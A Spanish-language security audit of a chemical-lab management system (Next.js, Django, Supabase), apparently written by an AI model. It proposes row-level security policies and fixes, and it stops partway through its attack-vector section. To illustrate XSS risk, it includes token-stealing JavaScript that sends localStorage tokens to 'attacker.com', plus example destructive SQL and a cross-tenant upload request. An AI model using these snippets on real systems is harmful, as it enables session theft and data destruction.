# ANÁLISIS DE CIBERSEGURIDAD - EVOLUTION CHEMICAL

## Proyecto: Sistema de Gestión de Análisis Químicos

**Fecha de Análisis:** 2026-05-25
**Alcance:** Frontend (Next.js) + Backend (Django) + Base de Datos (Supabase PostgreSQL)
**Analista:** Claude Sonnet 4.5

---

## ÍNDICE

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Análisis del Schema de Base de Datos](#análisis-del-schema-de-base-de-datos)
3. [Propuesta de Row Level Security (RLS)](#propuesta-de-row-level-security-rls)
4. [Vulnerabilidades del Backend](#vulnerabilidades-del-backend)
5. [Vulnerabilidades del Frontend](#vulnerabilidades-del-frontend)
6. [Vectores de Ataque Identificados](#vectores-de-ataque-identificados)
7. [Exposición de Datos Sensibles](#exposición-de-datos-sensibles)
8. [Matriz de Riesgo](#matriz-de-riesgo)
9. [Recomendaciones Prioritarias](#recomendaciones-prioritarias)
10. [Plan de Remediación](#plan-de-remediación)

---

## RESUMEN EJECUTIVO

### Estado Actual de Seguridad: ⚠️ RIESGO MEDIO-ALTO

El sistema presenta una **arquitectura de seguridad parcialmente implementada** con vulnerabilidades críticas que requieren atención inmediata:

#### Problemas Críticos (Prioridad Alta):

1. **❌ CRÍTICO:** Base de datos SIN Row Level Security (RLS) - Cualquier usuario autenticado puede acceder a datos de otras empresas a nivel de BD
2. **❌ CRÍTICO:** Tokens JWT almacenados en localStorage - Vulnerable a ataques XSS
3. **⚠️ ALTO:** ChromatographyViewSet sin validación de permisos por empresa - Cualquier usuario autenticado puede ver/modificar análisis de otras empresas
4. **⚠️ ALTO:** CORS_ALLOW_ALL_ORIGINS en desarrollo - Riesgo de CSRF en entorno de desarrollo

#### Fortalezas Identificadas:

- ✅ Autenticación robusta con Supabase
- ✅ RBAC implementado (Owner/Company Admin)
- ✅ Rate limiting configurado
- ✅ Middleware de seguridad en producción
- ✅ Refresh token automático
- ✅ TypeScript con strict mode

---

## ANÁLISIS DEL SCHEMA DE BASE DE DATOS

### Contexto de Seguridad

**Empresa Propietaria (Laboratorio):**

- `company_id = '45a7324c-931e-455a-be9a-5bf3d0492985'`
- Usuarios con este company_id tienen acceso TOTAL
- Usuarios con `role = 'owner'` tienen acceso TOTAL

**Empresas Clientes:**

- Todas las demás empresas
- Solo pueden acceder a sus propios datos
- Usuarios con `role = 'company_admin'` solo ven datos de su empresa

### Estado Actual: ⚠️ SIN ROW LEVEL SECURITY (RLS)

**Implicaciones:**

```
┌─────────────────────────────────────────────────────┐
│  PROBLEMA: Base de datos completamente abierta      │
│  a cualquier conexión autenticada con Supabase      │
├─────────────────────────────────────────────────────┤
│  Si un atacante obtiene:                            │
│  • anon_key o service_role_key                      │
│  • Un token JWT válido                              │
│                                                      │
│  Puede ejecutar queries SQL directos:               │
│  SELECT * FROM chromatographic_analyses;            │
│  SELECT * FROM companies;                           │
│  SELECT * FROM samples;                             │
│  DELETE FROM user_profiles WHERE role='owner';      │
└─────────────────────────────────────────────────────┘
```

### Tablas Críticas Sin RLS

#### 1. `user_profiles` - **CRÍTICO**

```sql
-- Estado actual: SIN PROTECCIÓN
-- Riesgo: Exposición de emails, roles, company_id de todos los usuarios
-- Vector: SELECT * FROM user_profiles; -- Funciona sin restricciones
```

**Datos expuestos:**

- ✗ user_id (UUIDs de todos los usuarios)
- ✗ name (nombres completos)
- ✗ email (correos electrónicos)
- ✗ company_id (relación empresa-usuario)
- ✗ role (roles de acceso)

#### 2. `companies` - **CRÍTICO**

```sql
-- Estado actual: SIN PROTECCIÓN
-- Riesgo: Listado completo de clientes del laboratorio
-- Vector: SELECT * FROM companies; -- Expone toda la cartera de clientes
```

**Datos expuestos:**

- ✗ Nombres de todas las empresas clientes
- ✗ Teléfonos y emails de contacto
- ✗ Localidades (información comercial sensible)
- ✗ Permisos (can_view_results)

#### 3. `chromatographic_analyses` - **CRÍTICO**

```sql
-- Estado actual: SIN PROTECCIÓN
-- Riesgo: Resultados de análisis químicos de competidores
-- Vector: SELECT * FROM chromatographic_analyses WHERE company_id != 'mi_empresa';
```

**Datos expuestos:**

- ✗ Composición química completa de muestras
- ✗ Propiedades calculadas (ventaja competitiva)
- ✗ Nombres de campos y pozos (información estratégica)
- ✗ Informes HTML completos

#### 4. `samples` - **ALTO**

```sql
-- Estado actual: SIN PROTECCIÓN
-- Riesgo: Información sobre muestras y análisis solicitados
```

**Datos expuestos:**

- ✗ Códigos internos de muestras
- ✗ Tipos de análisis solicitados
- ✗ Fechas de muestreo
- ✗ Emails de contacto

#### 5. `analyses` - **MEDIO**

```sql
-- Estado actual: SIN PROTECCIÓN
-- Riesgo: Resultados de análisis generales
```

#### 6. `reports` - **MEDIO**

```sql
-- Estado actual: SIN PROTECCIÓN
-- Riesgo: Rutas de archivos de reportes
```

#### 7. `compounds` - **BAJO**

```sql
-- Estado actual: SIN PROTECCIÓN
-- Riesgo: Datos de referencia públicos (aceptable sin RLS)
```

**Nota:** Esta tabla contiene datos de referencia químicos, no datos sensibles.

---

## PROPUESTA DE ROW LEVEL SECURITY (RLS)

### Configuración Global

```sql
-- ============================================
-- HABILITAR RLS EN TODAS LAS TABLAS CRÍTICAS
-- ============================================

-- Habilitar RLS
ALTER TABLE user_profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE companies ENABLE ROW LEVEL SECURITY;
ALTER TABLE chromatographic_analyses ENABLE ROW LEVEL SECURITY;
ALTER TABLE samples ENABLE ROW LEVEL SECURITY;
ALTER TABLE analyses ENABLE ROW LEVEL SECURITY;
ALTER TABLE reports ENABLE ROW LEVEL SECURITY;

-- Compounds NO necesita RLS (datos de referencia públicos)
```

### 1. Políticas para `user_profiles`

```sql
-- ============================================
-- POLÍTICAS: user_profiles
-- ============================================

-- Policy 1: Los usuarios pueden ver su propio perfil
CREATE POLICY "users_select_own_profile" ON user_profiles
FOR SELECT
USING (auth.uid()::text = user_id::text);

-- Policy 2: OWNERS pueden ver todos los perfiles
CREATE POLICY "owners_select_all_profiles" ON user_profiles
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 3: COMPANY_ADMIN pueden ver perfiles de su empresa
CREATE POLICY "company_admin_select_company_profiles" ON user_profiles
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = user_profiles.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 4: Solo OWNERS pueden insertar nuevos usuarios
CREATE POLICY "owners_insert_users" ON user_profiles
FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 5: Solo OWNERS pueden actualizar usuarios
CREATE POLICY "owners_update_users" ON user_profiles
FOR UPDATE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 6: Solo OWNERS pueden eliminar usuarios
CREATE POLICY "owners_delete_users" ON user_profiles
FOR DELETE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);
```

### 2. Políticas para `companies`

```sql
-- ============================================
-- POLÍTICAS: companies
-- ============================================

-- Policy 1: OWNERS pueden ver todas las empresas
CREATE POLICY "owners_select_all_companies" ON companies
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 2: COMPANY_ADMIN pueden ver su propia empresa
CREATE POLICY "company_admin_select_own_company" ON companies
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = companies.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 3: Solo OWNERS pueden crear empresas
CREATE POLICY "owners_insert_companies" ON companies
FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 4: Solo OWNERS pueden actualizar empresas
CREATE POLICY "owners_update_companies" ON companies
FOR UPDATE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 5: Solo OWNERS pueden eliminar empresas
CREATE POLICY "owners_delete_companies" ON companies
FOR DELETE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);
```

### 3. Políticas para `chromatographic_analyses`

```sql
-- ============================================
-- POLÍTICAS: chromatographic_analyses
-- ============================================

-- Policy 1: OWNERS pueden ver todos los análisis
CREATE POLICY "owners_select_all_analyses" ON chromatographic_analyses
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 2: COMPANY_ADMIN pueden ver análisis de su empresa
CREATE POLICY "company_admin_select_own_analyses" ON chromatographic_analyses
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = chromatographic_analyses.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 3: Solo OWNERS pueden insertar análisis
CREATE POLICY "owners_insert_analyses" ON chromatographic_analyses
FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 4: Solo OWNERS pueden actualizar análisis
CREATE POLICY "owners_update_analyses" ON chromatographic_analyses
FOR UPDATE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 5: Solo OWNERS pueden eliminar análisis
CREATE POLICY "owners_delete_analyses" ON chromatographic_analyses
FOR DELETE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);
```

### 4. Políticas para `samples`

```sql
-- ============================================
-- POLÍTICAS: samples
-- ============================================

-- Policy 1: OWNERS pueden ver todas las muestras
CREATE POLICY "owners_select_all_samples" ON samples
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 2: COMPANY_ADMIN pueden ver muestras de su empresa
CREATE POLICY "company_admin_select_own_samples" ON samples
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = samples.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 3: COMPANY_ADMIN pueden crear muestras para su empresa
CREATE POLICY "company_admin_insert_own_samples" ON samples
FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = samples.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 4: OWNERS pueden crear muestras para cualquier empresa
CREATE POLICY "owners_insert_samples" ON samples
FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 5: COMPANY_ADMIN pueden actualizar muestras de su empresa
CREATE POLICY "company_admin_update_own_samples" ON samples
FOR UPDATE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = samples.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 6: OWNERS pueden actualizar cualquier muestra
CREATE POLICY "owners_update_samples" ON samples
FOR UPDATE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 7: Solo OWNERS pueden eliminar muestras
CREATE POLICY "owners_delete_samples" ON samples
FOR DELETE
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);
```

### 5. Políticas para `analyses`

```sql
-- ============================================
-- POLÍTICAS: analyses
-- ============================================

-- Policy 1: OWNERS pueden ver todos los análisis
CREATE POLICY "owners_select_all_general_analyses" ON analyses
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 2: COMPANY_ADMIN pueden ver análisis de muestras de su empresa
CREATE POLICY "company_admin_select_own_analyses" ON analyses
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    JOIN samples s ON s.sample_id = analyses.sample_id
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = s.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 3: Solo OWNERS pueden insertar/actualizar/eliminar análisis
CREATE POLICY "owners_manage_analyses" ON analyses
FOR ALL
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);
```

### 6. Políticas para `reports`

```sql
-- ============================================
-- POLÍTICAS: reports
-- ============================================

-- Policy 1: OWNERS pueden ver todos los reportes
CREATE POLICY "owners_select_all_reports" ON reports
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);

-- Policy 2: COMPANY_ADMIN pueden ver reportes de muestras de su empresa
CREATE POLICY "company_admin_select_own_reports" ON reports
FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    JOIN samples s ON s.sample_id = reports.sample_id
    WHERE up.user_id::text = auth.uid()::text
    AND up.company_id = s.company_id
    AND up.role = 'company_admin'
  )
);

-- Policy 3: Solo OWNERS pueden gestionar reportes
CREATE POLICY "owners_manage_reports" ON reports
FOR ALL
USING (
  EXISTS (
    SELECT 1 FROM user_profiles up
    WHERE up.user_id::text = auth.uid()::text
    AND up.role = 'owner'
  )
);
```

### 7. Función Helper para RLS

```sql
-- ============================================
-- FUNCIÓN HELPER: Obtener rol del usuario actual
-- ============================================

CREATE OR REPLACE FUNCTION public.get_current_user_role()
RETURNS text
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  RETURN (
    SELECT role
    FROM user_profiles
    WHERE user_id::text = auth.uid()::text
    LIMIT 1
  );
END;
$$;

-- ============================================
-- FUNCIÓN HELPER: Obtener company_id del usuario actual
-- ============================================

CREATE OR REPLACE FUNCTION public.get_current_user_company_id()
RETURNS uuid
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  RETURN (
    SELECT company_id
    FROM user_profiles
    WHERE user_id::text = auth.uid()::text
    LIMIT 1
  );
END;
$$;

-- ============================================
-- FUNCIÓN HELPER: Verificar si usuario es OWNER
-- ============================================

CREATE OR REPLACE FUNCTION public.is_owner()
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  RETURN (
    SELECT EXISTS (
      SELECT 1
      FROM user_profiles
      WHERE user_id::text = auth.uid()::text
      AND role = 'owner'
    )
  );
END;
$$;
```

---

## VULNERABILIDADES DEL BACKEND

### 1. ❌ CRÍTICO: ChromatographyViewSet sin RBAC

**Archivo:** `apps/chromatography/views.py`

**Problema:**

```python
class ChromatographicAnalysisViewSet(viewsets.ModelViewSet):
    permission_classes = [permissions.IsAuthenticated]  # ❌ SOLO IsAuthenticated
    # Falta: CanManageAnalyses o similar
```

**Impacto:**

- Cualquier usuario autenticado puede:
  - ✗ Ver análisis de TODAS las empresas
  - ✗ Modificar análisis de otras empresas
  - ✗ Eliminar análisis
  - ✗ Subir archivos XLSX para cualquier empresa
  - ✗ Generar reportes de cualquier empresa

**Evidencia de código:**

```python
# Endpoint: POST /api/v1/chromatography/analyses/upload-xlsx/
@action(detail=False, methods=["POST"])
def upload_xlsx(self, request):
    # ❌ Sin validación de company_id contra el usuario actual
    company_id = data.get("company_id")  # Acepta cualquier company_id
    # ...
```

**Explotación:**

```bash
# Un usuario de empresa A puede subir análisis para empresa B
curl -X POST \
  -H "Authorization: Bearer <token_empresa_A>" \
  -F "xlsx_file=@archivo.xlsx" \
  -F "company_id=<uuid_empresa_B>" \
  http://api/chromatography/analyses/upload-xlsx/
```

**Solución requerida:**

```python
# Agregar validación de permisos
permission_classes = [permissions.IsAuthenticated, CanManageAnalyses]

# En el método upload_xlsx:
def upload_xlsx(self, request):
    company_id = data.get("company_id")

    # Validar que el usuario puede acceder a esta empresa
    if request.user.role != UserRole.OWNER:
        if str(request.user.company_id) != company_id:
            raise PermissionDenied("No puede crear análisis para otra empresa")
```

### 2. ⚠️ ALTO: CORS Permisivo en Desarrollo

**Archivo:** `config/settings/development.py`

**Problema:**

```python
CORS_ALLOW_ALL_ORIGINS = True  # ❌ Acepta requests desde cualquier origen
```

**Impacto:**

- Vulnerable a CSRF desde cualquier dominio
- Un sitio malicioso puede hacer requests autenticados si el usuario tiene la sesión abierta
- No hay validación de origen en desarrollo

**Solución requerida:**

```python
# development.py
CORS_ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://127.0.0.1:3000",
]
CORS_ALLOW_CREDENTIALS = True
```

### 3. ⚠️ ALTO: Logout no Invalida Token en Supabase

**Archivo:** `apps/authentication/views.py`

**Problema:**

```python
class LogoutView(APIView):
    def post(self, request):
        # Limpia cache local
        cache.delete(f"user_profile_{request.user.user_id}")
        # ❌ NO invalida el token en Supabase
        return Response({"message": "Logout exitoso"})
```

**Impacto:**

- El token JWT sigue siendo válido después del logout
- Si un atacante obtiene el token, puede usarlo hasta que expire naturalmente
- No hay revocación real de sesión

**Solución requerida:**

```python
def post(self, request):
    try:
        # Obtener el token del request
        token = request.META.get('HTTP_AUTHORIZATION', '').split(' ')[1]

        # Invalidar en Supabase
        supabase_client.auth.sign_out(token)

        # Limpiar cache
        cache.delete(f"user_profile_{request.user.user_id}")
        cache.delete(f"jwt_valid_{token}")

        return Response({"message": "Logout exitoso"})
    except Exception as e:
        logger.error(f"Error en logout: {e}")
        return Response({"error": "Error al cerrar sesión"}, status=500)
```

### 4. ⚠️ MEDIO: Cache en Memoria No Escalable

**Archivo:** `config/settings/base.py`

**Problema:**

```python
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',
        # ❌ Cache en memoria local
        # No compartido entre instancias
    }
}
```

**Impacto:**

- En un entorno con múltiples instancias (load balancer), cada instancia tiene su propio cache
- Validaciones de JWT pueden ser inconsistentes
- Invalidación de cache (logout) solo afecta a una instancia

**Solución requerida:**

```python
# Usar Redis para cache distribuido
CACHES = {
    'default': {
        'BACKEND': 'django_redis.cache.RedisCache',
        'LOCATION': env('REDIS_URL', default='redis://127.0.0.1:6379/1'),
        'OPTIONS': {
            'CLIENT_CLASS': 'django_redis.client.DefaultClient',
        }
    }
}
```

### 5. ⚠️ MEDIO: SECRET_KEY con Default Inseguro

**Archivo:** `config/settings/base.py`

**Problema:**

```python
SECRET_KEY = env("SECRET_KEY", default="django-insecure-default-key")
# ❌ Tiene un default que podría usarse en producción por error
```

**Impacto:**

- Si la variable de entorno no está configurada, usa un valor predecible
- Permite firmar tokens Django, cookies de sesión
- Compromete la seguridad de toda la aplicación

**Solución requerida:**

```python
# Forzar que SECRET_KEY exista en producción
if env("ENVIRONMENT") == "production":
    SECRET_KEY = env("SECRET_KEY")  # Sin default, falla si no existe
else:
    SECRET_KEY = env("SECRET_KEY", default="django-insecure-dev-key-only")
```

### 6. ⚠️ MEDIO: Uso de anon_key en lugar de service_role

**Archivo:** `apps/authentication/authentication.py`

**Problema:**

```python
# Inicializa cliente con anon_key
supabase_client = create_client(
    env("SUPABASE_URL"),
    env("SUPABASE_ANON_KEY")  # ⚠️ Anon key tiene permisos limitados
)
```

**Impacto:**

- anon_key está diseñado para el frontend (público)
- service_role_key debe usarse en el backend para operaciones administrativas
- Podría haber limitaciones en queries complejos o RLS bypass

**Solución requerida:**

```python
# Usar service_role_key en backend
supabase_admin_client = create_client(
    env("SUPABASE_URL"),
    env("SUPABASE_SERVICE_ROLE_KEY")  # Clave administrativa
)
```

### 7. ⚠️ BAJO: SSL Redirect Deshabilitado por Defecto

**Archivo:** `config/settings/production.py`

**Problema:**

```python
SECURE_SSL_REDIRECT = env.bool("SECURE_SSL_REDIRECT", default=False)
# ⚠️ Debería ser True por defecto en producción
```

**Impacto:**

- Permite conexiones HTTP sin redirigir a HTTPS
- Riesgo de man-in-the-middle
- Tokens y credenciales podrían transmitirse sin cifrar

**Solución requerida:**

```python
SECURE_SSL_REDIRECT = True  # Forzar HTTPS en producción
```

### 8. ⚠️ BAJO: Rate Limiting Generoso

**Archivo:** `config/settings/base.py`

**Problema:**

```python
'DEFAULT_THROTTLE_RATES': {
    'anon': '100/hour',  # ⚠️ Permite 100 requests/hora sin autenticación
    'user': '1000/hour', # ⚠️ 1000 requests/hora por usuario
}
```

**Impacto:**

- Rate limits muy altos permiten ataques de fuerza bruta
- Login endpoint sin rate limit específico más restrictivo

**Solución requerida:**

```python
'DEFAULT_THROTTLE_RATES': {
    'anon': '20/hour',        # Más restrictivo para anónimos
    'user': '500/hour',       # Reducir límite de usuarios
    'login': '5/hour',        # Rate limit específico para login
    'sensitive': '10/minute', # Para operaciones sensibles
}
```

---

## VULNERABILIDADES DEL FRONTEND

### 1. ❌ CRÍTICO: Tokens JWT en localStorage

**Archivo:** `src/modules/auth/services/AuthService/AuthService.ts`

**Problema:**

```typescript
// ❌ Almacena tokens en localStorage
localStorage.setItem('accessToken', token);
localStorage.setItem('refreshToken', refreshToken);
```

**Impacto:**

- **Vulnerable a XSS (Cross-Site Scripting)**
- Cualquier script malicioso puede acceder a los tokens:
  ```javascript
  // Script inyectado puede robar tokens
  const token = localStorage.getItem('accessToken');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),
  });
  ```
- No hay protección de httpOnly
- Accesible desde cualquier JavaScript en el dominio

**Vectores de ataque:**

1. **XSS Reflejado:** URL maliciosa con script
2. **XSS Almacenado:** Comentario/campo con script inyectado
3. **Extensión maliciosa del navegador**
4. **Third-party script comprometido**

**Solución requerida:**

```typescript
// Opción 1: Usar httpOnly cookies (RECOMENDADO)
// Backend debe enviar cookies en lugar de tokens en response
// Frontend NO almacena tokens, se envían automáticamente

// Opción 2: Si se deben usar tokens (no recomendado)
// - Implementar CSP estricto
// - Usar httpOnly cookies para refresh token
// - Access token de corta duración en memoria (NO localStorage)

class AuthService {
  private accessToken: string | null = null; // En memoria, se pierde al recargar

  setTokens(access: string, refresh: string) {
    this.accessToken = access; // Solo en memoria
    // Refresh token en httpOnly cookie (manejado por backend)
  }
}
```

### 2. ⚠️ ALTO: API_URL Expuesta en Bundle

**Archivo:** `.env.local`

**Problema:**

```bash
NEXT_PUBLIC_API_URL=http://localhost:8000/api/v1
# ⚠️ NEXT_PUBLIC_ expone la variable en el bundle del cliente
```

**Impacto:**

- URL del API visible en el código JavaScript del cliente
- Facilita reconocimiento del backend
- No es crítico si el API es público, pero expone información

**Evidencia:**

```javascript
// En el bundle de producción:
var API_URL = 'https://api.evolutionchemical.com/api/v1';
// Visible en DevTools > Sources
```

**Mitigación:**

- Esto es esperado con Next.js (variables NEXT*PUBLIC* son públicas)
- Asegurar que el backend tenga protecciones adecuadas
- No confiar en "seguridad por oscuridad"

### 3. ⚠️ ALTO: JWT Decodificado sin Validación

**Archivo:** `src/modules/auth/services/AuthService/AuthService.ts`

**Problema:**

```typescript
private isTokenExpired(token: string): boolean {
  const decoded = jwtDecode<JWTPayload>(token);
  // ⚠️ Decodifica JWT sin validar firma
  // Solo lee el payload para verificar expiración
}
```

**Impacto:**

- La firma NO se valida en el cliente
- Un atacante podría modificar el payload del token
- **Mitigado:** El backend SÍ valida la firma (correcto)

**Aclaración:**

- Este patrón es aceptable si:
  - Solo se usa para UI/UX (mostrar nombre, rol)
  - Backend SIEMPRE valida la firma
  - NO se toman decisiones de seguridad en base al token decodificado

**Recomendación:**

```typescript
// Agregar comentario de advertencia
/**
 * ⚠️ IMPORTANTE: Esta decodificación NO valida la firma del JWT.
 * Solo se usa para mejorar UX (mostrar datos, verificar expiración).
 * NUNCA confiar en estos datos para decisiones de seguridad.
 * El backend SIEMPRE valida la firma antes de autorizar.
 */
private isTokenExpired(token: string): boolean {
  const decoded = jwtDecode<JWTPayload>(token);
  // ...
}
```

### 4. ⚠️ MEDIO: Sin Content Security Policy (CSP)

**Archivo:** `next.config.js`

**Problema:**

```javascript
// ❌ No hay headers de seguridad configurados
module.exports = {
  // Sin CSP
};
```

**Impacto:**

- No hay protección contra XSS a nivel de navegador
- Scripts inline pueden ejecutarse sin restricción
- Recursos pueden cargarse desde cualquier origen

**Solución requerida:**

```javascript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval' 'unsafe-inline'", // Next.js requiere unsafe-eval
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://api.evolutionchemical.com",
              "frame-ancestors 'none'",
              "base-uri 'self'",
              "form-action 'self'",
            ].join('; '),
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=()',
          },
        ],
      },
    ];
  },
};
```

### 5. ⚠️ MEDIO: Logout Fire-and-Forget

**Archivo:** `src/modules/auth/services/AuthService/AuthService.ts`

**Problema:**

```typescript
async logout(): Promise<void> {
  try {
    await apiClient.post('/auth/logout', {}, true);
  } catch (error) {
    // ⚠️ Se ignora el error, el logout local continúa
  }

  // Limpia localStorage incluso si el backend falló
  localStorage.removeItem('accessToken');
  localStorage.removeItem('refreshToken');
}
```

**Impacto:**

- Si el backend falla, el token sigue válido en el servidor
- El usuario cree que cerró sesión, pero el token aún funciona
- Posible inconsistencia de estado

**Solución requerida:**

```typescript
async logout(): Promise<void> {
  try {
    // Intentar logout en backend
    await apiClient.post('/auth/logout', {}, true);

    // Solo limpiar si el backend tuvo éxito
    this.clearAuthData();
  } catch (error) {
    // Si falla el backend, advertir al usuario
    console.error('Error al cerrar sesión en el servidor');

    // Aún así limpiar local (usuario quiere desloguearse)
    this.clearAuthData();

    // Opcional: Mostrar advertencia al usuario
    throw new Error('Sesión cerrada localmente. Por favor, cierra todas las pestañas.');
  }
}
```

### 6. ⚠️ BAJO: Datos en sessionStorage

**Archivo:** Varios componentes usan sessionStorage

**Problema:**

```typescript
// ⚠️ Almacena nombre en sessionStorage
window.sessionStorage.setItem('login-welcome-name', name);
```

**Impacto:**

- sessionStorage también es accesible a JavaScript (vulnerable a XSS)
- Aunque son datos menos sensibles (nombre de bienvenida)

**Mitigación:**

- Estos datos no son críticos
- Aceptable para datos de UI/UX

### 7. ⚠️ BAJO: Sin HTTPS Enforcement en Config

**Archivo:** Configuración de Next.js

**Problema:**

- No hay redirección forzada a HTTPS en configuración de Next.js
- Depende del servidor web (Vercel, Nginx, etc.)

**Solución requerida:**

```javascript
// next.config.js (para producción self-hosted)
if (process.env.NODE_ENV === 'production') {
  // Middleware para forzar HTTPS
  // O configurar en Nginx/Apache/Cloud Provider
}
```

---

## VECTORES DE ATAQUE IDENTIFICADOS

### Vector 1: ⚠️ CRÍTICO - Acceso Directo a Base de Datos

**Escenario:**

```
1. Atacante obtiene anon_key de Supabase (visible en requests del frontend)
2. Atacante obtiene un JWT válido (phishing, XSS, etc.)
3. Atacante ejecuta queries SQL directos contra Supabase

┌──────────────────────────────────────────────────────────┐
│ Sin RLS, el atacante puede:                              │
├──────────────────────────────────────────────────────────┤
│ SELECT * FROM companies;                                 │
│ → Obtiene listado completo de clientes del laboratorio  │
│                                                          │
│ SELECT * FROM chromatographic_analyses;                  │
│ → Roba todos los análisis químicos de todos los clientes│
│                                                          │
│ SELECT * FROM user_profiles;                             │
│ → Expone emails y roles de todos los usuarios           │
│                                                          │
│ UPDATE companies SET can_view_results = false           │
│ WHERE company_id != 'atacante';                          │
│ → Bloquea acceso a resultados para otras empresas       │
│                                                          │
│ DELETE FROM chromatographic_analyses                     │
│ WHERE company_id = 'competidor';                         │
│ → Destruye datos de competidores                        │
└──────────────────────────────────────────────────────────┘
```

**Probabilidad:** ALTA (anon_key es pública por diseño)
**Impacto:** CRÍTICO (pérdida total de confidencialidad, integridad y disponibilidad)

**Controles Mitigantes Actuales:** ❌ NINGUNO
**Remediación:** Implementar RLS (propuestas en sección anterior)

---

### Vector 2: ⚠️ ALTO - Cross-Site Scripting (XSS) + Robo de Tokens

**Escenario:**

```
1. Atacante encuentra vulnerabilidad XSS en la aplicación
   - Campo de texto sin sanitizar
   - URL con parámetros reflejados
   - Componente third-party comprometido

2. Atacante inyecta script malicioso:

<script>
  // Robar tokens de localStorage
  const access = localStorage.getItem('accessToken');
  const refresh = localStorage.getItem('refreshToken');
  const user = localStorage.getItem('user');

  // Enviar a servidor del atacante
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ access, refresh, user })
  });
</script>

3. Víctima ejecuta el script (visita URL, ve comentario malicioso, etc.)
4. Atacante obtiene tokens JWT válidos
5. Atacante usa tokens para:
   - Acceder como la víctima
